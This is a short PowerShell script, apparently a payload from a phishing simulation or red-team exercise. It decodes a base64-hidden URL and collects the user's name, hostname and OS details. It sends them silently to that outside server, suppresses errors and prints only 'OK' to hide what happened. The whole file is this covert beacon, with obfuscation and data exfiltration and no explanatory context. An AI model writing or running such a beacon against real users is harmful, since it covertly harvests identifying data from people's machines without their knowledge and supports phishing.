$b64 = "aHR0cHM6Ly9ydGVhbS5jcHFkLmNvbS5ici9waGlzaGluZw=="
$B = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$u=$env:USERNAME; if(-not $u){$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
$h=[System.Net.Dns]::GetHostName()
$o=[System.Runtime.InteropServices.RuntimeInformation]::OSDescription
$q="app=exe&user=$([uri]::EscapeDataString($u))&host=$([uri]::EscapeDataString($h))&os=$([uri]::EscapeDataString($o))"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri "$B`?$q" -ErrorAction SilentlyContinue | Out-Null
Write-Output "OK"
